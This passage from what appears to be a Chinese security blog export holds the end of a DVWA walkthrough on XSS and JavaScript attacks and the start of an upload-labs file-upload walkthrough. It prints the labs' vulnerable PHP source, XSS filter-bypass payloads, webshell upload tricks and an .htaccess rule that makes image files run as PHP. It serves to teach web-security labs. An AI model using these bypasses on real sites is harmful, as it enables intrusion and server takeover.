constant">NULL</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Feedback for end user</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;pre>Hello '</span> <span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有进行任何判断和过滤，直接输入<script>alert(666)</script>，成功</p><h3 id="Medium-8"><a href="#Medium-8" class="headerlink" title="Medium"></a>Medium</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"X-XSS-Protection: 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Is there any input?</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"name"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Get input</span><span class="token comment">//将输入中的&lt;script>转化为空</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;script>'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Feedback for end user</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>Hello $&#123;name&#125;&lt;/pre>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>会对<code>&lt;script&gt;</code>进行检查，将其替换成空，但是str_replace函数是区分大小写的，可以交替大小写绕过<code>&lt;sCript&gt;alert(666)&lt;/ScRipt&gt;</code>，也可以双写绕过：<code>&lt;sc&lt;script&gt;ript&gt;alert(666)&lt;/script&gt;</code></p><h3 id="High-9"><a href="#High-9" class="headerlink" title="High"></a>High</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"X-XSS-Protection: 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Is there any input?</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"name"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Get input</span><span class="token comment">//使用通配符，完全匹配script*N，所以有关script的标签全被过滤</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Feedback for end user</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>Hello $&#123;name&#125;&lt;/pre>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>preg_replace() 函数执行一个正则表达式的搜索和替换，“*” 代表一个或多个任意字符，“i” 代表不区分大小写，这次是杜绝了一切script的字符，但我们仍然可以通过其他的标签例如 img、body 等标签的事件或者iframe 等标签的 src 注入 JS 攻击脚本。<code>&lt;img src = 1 onerror = alert(1)&gt;</code></p><h2 id="0x0A-Stored-Cross-Site-Scripting-XSS"><a href="#0x0A-Stored-Cross-Site-Scripting-XSS" class="headerlink" title="0x0A Stored Cross Site Scripting (XSS)"></a>0x0A Stored Cross Site Scripting (XSS)</h2><hr><p>XSS存储型攻击，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型XSS的危害会更大。因为存储型XSS的代码存在于网页的代码中，可以说是永久型的。存储型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p><h3 id="Low-10"><a href="#Low-10" class="headerlink" title="Low"></a>Low</h3><p>这一关没有对xss有检查，因为在Name有长度限制，所以直接在Message中进行注入<code>&lt;script&gt;alert(666)&lt;/script&gt;</code><br>补充几个函数：</p><ul><li><p>trim(string,charlist)<br>函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符。</p></li><li><p>stripslashes(string)<br>函数删除字符串中的反斜杠。</p></li></ul><p>以及老朋友：</p><ul><li>mysql_real_escape_string(string,connection)<br>函数会对字符串中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。</li></ul><h3 id="Medium-9"><a href="#Medium-9" class="headerlink" title="Medium"></a>Medium</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'btnSign'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Get input</span>    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'mtxMessage'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$name</span>    <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'txtName'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Sanitize message input</span><span class="token comment">// strip_tags() 函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用&lt;b>标签</span><span class="token comment">// addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串</span>    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">strip_tags</span><span class="token punctuation">(</span> <span class="token function">addslashes</span><span class="token punctuation">(</span> <span class="token variable">$message</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$message</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span> <span class="token variable">$message</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// htmlspecialchars(str)函数将字符串转化为HTML实体</span>    <span class="token comment">// Sanitize name input</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;script>'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$name</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Update database</span>    <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO guestbook ( comment, name ) VALUES ( '<span class="token interpolation"><span class="token variable">$message</span></span>', '<span class="token interpolation"><span class="token variable">$name</span></span>' );"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;pre>'</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//mysql_close();</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>htmlspecialchars(str)函数将字符串转化为HTML实体，因此无法在message中进行注入xss（好像是可以绕过的，这里不讲述），于是在name里输入抓包更改内容即可。</p><h3 id="High-10"><a href="#High-10" class="headerlink" title="High"></a>High</h3><p>和上面反射型差不多，在message和Medium没区别，在Name里对<code>&lt;script&gt;</code>全部过滤了于是采用其他注入脚本<code>&lt;img src = onerror = alert(666)&gt;</code></p><h2 id="0x0B-JavaScript-Attacks"><a href="#0x0B-JavaScript-Attacks" class="headerlink" title="0x0B JavaScript Attacks"></a>0x0B JavaScript Attacks</h2><hr><h3 id="Low-11"><a href="#Low-11" class="headerlink" title="Low"></a>Low</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$page</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'body'</span><span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token string heredoc-string"><span class="token delimiter symbol"><span class="token punctuation">&lt;&lt;&lt;</span>EOF</span>&lt;script>…… function rot13(inp) &#123;        return inp.replace(/[a-zA-Z]/g,function(c)&#123;return String.fromCharCode((c&lt;="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);&#125;);    &#125;    function generate_token() &#123;        var phrase = document.getElementById("phrase").value;        document.getElementById("token").value = md5(rot13(phrase));    &#125;    generate_token();&lt;/script><span class="token delimiter symbol">EOF<span class="token punctuation">;</span></span></span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>JavaScript是一种基于对象和事件驱动的、并具有安全性能的脚本语言。是一种解释型语言（代码不需要进行预编译）。通常JavaScript脚本是通过嵌入在HTML中来实现自身的功能的。<br>若是涉及到Cookie、Session等记录用户信息的脚本，应该通过外部引入方式，并且不能暴露文件路径，控制好文件访问权限，若被攻击者获取到重要脚本代码，则能伪造其他合法用户进行伪造。<br>源码中说是用MD5加密的，我们抓包上传把Phrase改为success，根据源码来看token&#x3D;md5(rot13(phrase));，这里我们用火狐的控制台来操作输入md5(rot13(“success”))然后按ctrl+enter运行生成token把它替换给抓包就行了<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/41.png"><br>成功后是这样的：<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/42.png"></p><h3 id="Medium-10"><a href="#Medium-10" class="headerlink" title="Medium"></a>Medium</h3><p>剩下的不想写了直接给博客<a href="https://www.cnblogs.com/linfangnan/p/13739003.html#javascript-attacks-%E5%89%8D%E7%AB%AF%E6%94%BB%E5%87%BB">链接</a>吧</p><h3 id="High-11"><a href="#High-11" class="headerlink" title="High"></a>High</h3>]]></content>
      
      
      
        <tags>
            
            <tag> web靶场攻略 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs通关解析</title>
      <link href="/2023/04/25/upload-labs%E9%80%9A%E5%85%B3%E8%A7%A3%E6%9E%90/"/>
      <url>/2023/04/25/upload-labs%E9%80%9A%E5%85%B3%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="upload-labs-文件上传漏洞原理"><a href="#upload-labs-文件上传漏洞原理" class="headerlink" title="upload-labs 文件上传漏洞原理"></a>upload-labs 文件上传漏洞原理</h1><hr><p>本文源码可能与网上的不太一样导致关卡有些错乱，如果你的第五关和我的不一样，那么我的第5关就是你的第6关，依次类推到第9关</p><h3 id="产生条件"><a href="#产生条件" class="headerlink" title="产生条件"></a>产生条件</h3><p>1.服务器配置不当会导致任意文件上传<br>2.web应用开放了文件上传的功能，并对上传的文件没有进行足够的限制和过滤<br>3.web应用开放了文件上传功能，虽然在开发时加入了一定的过滤功能，但并不严格，可以被绕过<br>4.上传文件时如果服务端代码未对客户端上传的文件进行严格的验证和过滤，就容易造成可以上传任意文件的情况，包括上传脚本文件（asp、aspx、php、jsp等格式的文件）。</p><h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>恶意的脚本文件，又被称为webshell，webshell脚本称为一种网页后门，webshell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件、执行系统命令</p><h2 id="upload-labs-Pass-01"><a href="#upload-labs-Pass-01" class="headerlink" title="upload-labs Pass-01"></a>upload-labs Pass-01</h2><hr><p>第一关上传文件只允许jpg、png、gif后缀的文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//定义允许上传的文件类型</span><span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string double-quoted-string">".jpg|.png|.gif"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我们可以写个一句话木马把后缀名改成.jpg上传并用bp抓包并将文件名改回.php就可以发现我们绕过了检查<br>具体如下图：<br><img src="/images/upload-labs%E9%80%9A%E5%85%B3%E8%A7%A3%E6%9E%90/1.png"><br><img src="/images/upload-labs%E9%80%9A%E5%85%B3%E8%A7%A3%E6%9E%90/2.png"><br>然后用蚁剑连接就行</p><h2 id="upload-labs-Pass-02"><a href="#upload-labs-Pass-02" class="headerlink" title="upload-labs Pass-02"></a>upload-labs Pass-02</h2><hr><p>第二题仍然可以用第一题的方法做，这里用方法2：<br>第二关提示中说对MIME进行检查<br>什么是MIME？使用MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准，使用MIME类型可以设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。<br>常见MIME类型如下：<br><img src="/images/upload-labs%E9%80%9A%E5%85%B3%E8%A7%A3%E6%9E%90/3.png"><br>上传一个1.php文件将Content-Type：改为image&#x2F;png<br><img src="/images/upload-labs%E9%80%9A%E5%85%B3%E8%A7%A3%E6%9E%90/4.png"></p><h2 id="upload-labs-Pass-03-黑名单"><a href="#upload-labs-Pass-03-黑名单" class="headerlink" title="upload-labs Pass-03 黑名单"></a>upload-labs Pass-03 黑名单</h2><hr><p><strong>基于黑名单验证：只针对黑名单中没有的后缀名，文件才能上传成功。</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$UPLOAD_ADDR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.asp'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.aspx'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//屏蔽后缀</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//收尾去空</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$UPLOAD_ADDR</span><span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                 <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$UPLOAD_ADDR</span> <span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                 <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token variable">$UPLOAD_ADDR</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>定义一组后缀名，然后对于传输过去的文件，经过删除文件名末尾的点，从文件的点开始向后截取，<br>以及将文件名全部转化成小写，最后移除旁边的空格。<br>其中strrchr()函数的作用就是搜素并窃取搜索点及以后的位置<br>他禁用了挺多的类型的后缀的但是，我们还可以使用其他后缀进行绕过<br>phtml,php3,php4,php5,pht<br>这里就不示范了</p><h2 id="upload-labs-Pass-04"><a href="#upload-labs-Pass-04" class="headerlink" title="upload-labs Pass-04"></a>upload-labs Pass-04</h2><hr><p>第四关黑名单爆增，这里通过写一个.htaccess文件绕过，htaccess文件时Apache服务器中的一个配置文件，负责相关目录下网页配置，可以帮我们实现网页301重定向，自定义404错误页面，改变文件扩展名等功能<br>我们构造一个.htaccess文件，里面写上代码</p><pre class="line-numbers language-none"><code class="language-none">&lt;FilesMatch &quot;shuaige&quot;&gt;SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这串代码的作用是将上传的文件都作为.php来看，先将他上传上去，在将我们的1.png上传上去就可以绕过检查</p><h2 id="upload-labs-Pass-05"><a href="#upload-labs-Pass-05" class="headerlink" title="upload-labs Pass-05"></a>upload-labs Pass-05</h2><hr><p>源码如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$UPLOAD_ADDR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token 